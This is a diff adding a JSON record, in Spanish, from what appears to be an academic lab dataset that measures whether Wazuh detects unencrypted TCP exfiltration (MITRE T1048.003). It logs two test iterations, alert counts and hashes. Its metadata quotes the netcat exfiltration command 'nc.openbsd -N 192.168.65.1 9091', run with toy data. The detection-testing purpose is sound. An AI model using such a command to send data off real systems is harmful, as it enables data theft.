@@ -1,0 +1,80 @@
+{
+  "ata_id": "ATA042",
+  "tecnica": "T1048.003",
+  "tactica": "Exfiltration",
+  "sistema": "linux",
+  "bloque": "fase-03-ampliacion-2",
+  "tanda": "C",
+  "estado": "cerrado",
+  "artefacto": "Dataset/Ataques/Comandos/T1048.003-Unencrypted_Non-C2/",
+  "atomic": { "fuente": "custom", "nota": "exfiltracion EN CLARO por TCP crudo al receptor del HOST (nc.openbsd -N 192.168.65.1 9091). Contraste con ATA019 (simetrico) y ATA041 (asimetrico): el cifrado no cambia lo que ve el HIDS (el proceso). BINARIO REAL: nc -> /usr/bin/nc.openbsd" },
+  "esperado_sha256": "54155a899adbbe1f3f991f1e84d447b44d4b9823a5213172e07d3c8d519ddf63",
+  "ataque_sha256": "ee9e427b29810e9385b06cf4b1210e11d8299bacca0989833302faa8c1f8e856",
+  "validacion_humana_esperado": "APROBADO 2026-09-29",
+  "c0": {
+    "logtest": "Soporte/Ataques/c0/ATA042_logtest.txt",
+    "logtest_sha256": "a0e6a90ac9ceae3082f3d9be588befce9cf89044ab88bf602dd56c8326a76b8b",
+    "preflight": "Soporte/Ataques/c0/ATA042_preflight.md",
+    "preflight_sha256": "109e6c7619a3ce9074d5da277de8ea90f59c2386b779aacd71065f80c91fb770",
+    "resultado": "PASA (1 evento /usr/bin/nc.openbsd -> 80792 level 3; sin silenciador de fabrica)"
+  },
+  "iteraciones": [
+    {
+      "iter": 1, "t0": "2026-09-29T12:00:40Z", "t1": "2026-09-29T12:01:12Z", "duracion_s": 32, "snapshot": "lab-listo",
+      "diario": "/var/ossec/logs/alerts/2026/Sep/ossec-alerts-29.json",
+      "detalle": "Dataset/Ataques/Resultados/Wazuh/linux/CSV/ATA042_iter1-Detalle.csv",
+      "detalle_sha256": "1a970a0c98bd0349ce4d8ad6ca254c38ea2e4790c2962eb78dcb64fa4cf7349e",
+      "detalle_raw_sha256": "bbaaa3b1165205a2932828cd5cc302fe775794ac01e9d026983e793e87f07292",
+      "audited": "Dataset/Ataques/Resultados/Wazuh/linux/Auditado/ATA042_iter1-Audited.csv",
+      "audited_sha256": "dad5c94f56d732a951d14e85e6637f96ddf79d7c814072d24b98dc2aa39939f7",
+      "revision": "Dataset/Ataques/Resultados/Wazuh/linux/Auditado/ATA042_iter1-Revision.csv",
+      "revision_sha256": "f8e3a0c1d5d3410b42b181f2fee69de1262f0755f3cbc10c6f5bdc7d4d2f8956",
+      "conteos": { "filas": 1071, "deteccion": 1, "auto_ruido": 623, "ruido_conocido": 435, "dudosa": 0, "artefacto_ataque": 12 },
+      "rs": { "RS1": 1, "RS2": 1070, "RS3": 0, "RS4": 0, "UNKNOWN": 0 },
+      "ventana_raw": { "filas": 1077, "victima_linux": 1070, "otros_agentes_descartados": 7 },
+      "detecciones": { "alertas": 1, "rule_id_distintos": ["80792"], "esperadas": 1, "sorpresas": 0, "evidencia": "80792 execve /usr/bin/nc.openbsd (S1, anclado) 12:00:42.245Z" },
+      "metrico_o1": "si", "metrico_o2": "1/1", "dudosas_resueltas": 1,
+      "efecto": { "sink_log": "Dataset/Ataques/Resultados/Wazuh/linux/Logs/ATA042_iter1/sink.log", "sink_log_sha256": "fbb0f1afc50adc17adea6b84826810bb7c6042a30807de20d7e7db026f063110", "transporte": "TCP", "from": "192.168.65.129", "len": 173, "sha256_enviado_claro": "69ae035970a4663b3a45bbe0c24adc33affa9b0feac41d7273260cf94520b854", "sha256_sink": "69ae035970a4663b3a45bbe0c24adc33affa9b0feac41d7273260cf94520b854", "coincide": true }
+    },
+    {
+      "iter": 2, "t0": "2026-09-29T12:03:21Z", "t1": "2026-09-29T12:03:53Z", "duracion_s": 32, "snapshot": "lab-listo",
+      "diario": "/var/ossec/logs/alerts/2026/Sep/ossec-alerts-29.json",
+      "detalle": "Dataset/Ataques/Resultados/Wazuh/linux/CSV/ATA042_iter2-Detalle.csv",
+      "detalle_sha256": "cf0a2a2692934e16f5aa67f138813aa95c8b2fbe59b551aab773c46b3129d6aa",
+      "detalle_raw_sha256": "010809070dc7774cce390793a1421fde9250cb3aa75ed9a5a9d046abd30addb8",
+      "audited": "Dataset/Ataques/Resultados/Wazuh/linux/Auditado/ATA042_iter2-Audited.csv",
+      "audited_sha256": "f0548627888262e2ddfce3765b117097fb3f064bf4fdaa427baa25275fc5bd37",
+      "revision": "Dataset/Ataques/Resultados/Wazuh/linux/Auditado/ATA042_iter2-Revision.csv",
+      "revision_sha256": "1ea9ca098d781fc4bbf76b9dcdb59e5145870ddf2f46e70def6b36f67e1d083a",
+      "conteos": { "filas": 1088, "deteccion": 1, "auto_ruido": 621, "ruido_conocido": 454, "dudosa": 0, "artefacto_ataque": 12 },
+      "rs": { "RS1": 1, "RS2": 1087, "RS3": 0, "RS4": 0, "UNKNOWN": 0 },
+      "ventana_raw": { "filas": 1094, "victima_linux": 1087, "otros_agentes_descartados": 7 },
+      "detecciones": { "alertas": 1, "rule_id_distintos": ["80792"], "esperadas": 1, "sorpresas": 0, "evidencia": "80792 execve /usr/bin/nc.openbsd (S1, anclado) 12:03:22.531Z" },
+      "metrico_o1": "si", "metrico_o2": "1/1", "dudosas_resueltas": 1,
+      "efecto": { "sink_log": "Dataset/Ataques/Resultados/Wazuh/linux/Logs/ATA042_iter2/sink.log", "sink_log_sha256": "7c7bac7f64e4d432c2dac5850a5f48817983139a9f61ff7918d69d00b9c2a37d", "transporte": "TCP", "from": "192.168.65.129", "len": 173, "sha256_enviado_claro": "69ae035970a4663b3a45bbe0c24adc33affa9b0feac41d7273260cf94520b854", "sha256_sink": "69ae035970a4663b3a45bbe0c24adc33affa9b0feac41d7273260cf94520b854", "coincide": true }
+    }
+  ],
+  "revision_global": {
+    "fecha": "2026-09-29", "filas": 2,
+    "veredicto": "ruido (2: PAM 5502 del login del operador)",
+    "motivo": "1 fila por iteracion, ambas PAM 5502 de la sesion del operador -> ruido (criterio ratificado). Cero filas del ataque en ruido.",
+    "revisor": "executor ampliacion-2 tanda C"
+  },
+  "doble_iteracion": "iguales",
+  "doble_iteracion_detalle": { "criterio": "v2", "mismo_conjunto_rule_id_deteccion": true, "rule_ids_deteccion": ["80792"], "n1": 1, "n2": 1, "margen": 2, "criterio_recuento_ok": true, "sin_dudosas_sin_resolver": true, "auto_ruido_delta": 2, "ruido_conocido_delta": 19 },
+  "extraccion": { "extractor": "extraer_alertas.py H3 (sha256 repo==manager 4019fda84a59f4079529f7f95cc6fe9d250b46fb447b235b3c9a90ba64569c44)", "fuente": "fichero diario /var/ossec/logs/alerts/2026/Sep/ossec-alerts-29.json", "aislamiento": "filtro a agent_name == victima-linux" },
+  "prueba_de_efecto": "sink.log (TCP crudo): len=173 con sha256 del fichero EN CLARO identico al enviado (69ae0359...). El cifrado no cambia lo que ve el HIDS (proceso). Sin NAT",
+  "receptor": { "script": "Soporte/Ataques/receiver/sink_http.py", "bind": "192.168.65.1:9090 + tcp:9091", "modo_tcp": "--tcp-port 9091", "firewall": "NO se creo regla; TFG-sink-9090 verificado ausente", "parado_tras_t1": true },
+  "guardarrailes": { "endpoint_lab": true, "binario_real": "nc.openbsd (no nc)", "datos_juguete": true },
+  "hallazgos": [
+    "El cifrado NO cambia la deteccion: el HIDS ve el proceso (nc.openbsd aqui; openssl/curl en las cifradas).",
+    "BINARIO REAL: `nc` es enlace -> /usr/bin/nc.openbsd; declarar el nombre real es necesario."
+  ],
+  "eventos": [
+    { "ts": "2026-09-29T12:00:40Z", "tipo": "t0", "detalle": "iter1 t0 (revert lab-listo + 90 s asentamiento; receptor levantado antes)" },
+    { "ts": "2026-09-29T12:01:12Z", "tipo": "t1", "detalle": "iter1 t1 (tras scan FIM forzado)" },
+    { "ts": "2026-09-29T12:03:21Z", "tipo": "t0", "detalle": "iter2 t0" },
+    { "ts": "2026-09-29T12:03:53Z", "tipo": "t1", "detalle": "iter2 t1" },
+    { "ts": "2026-09-29T12:20:00Z", "tipo": "cierre", "detalle": "criterio v2: deteccion identica (1/1, {80792}) -> iguales" }
+  ]
+}
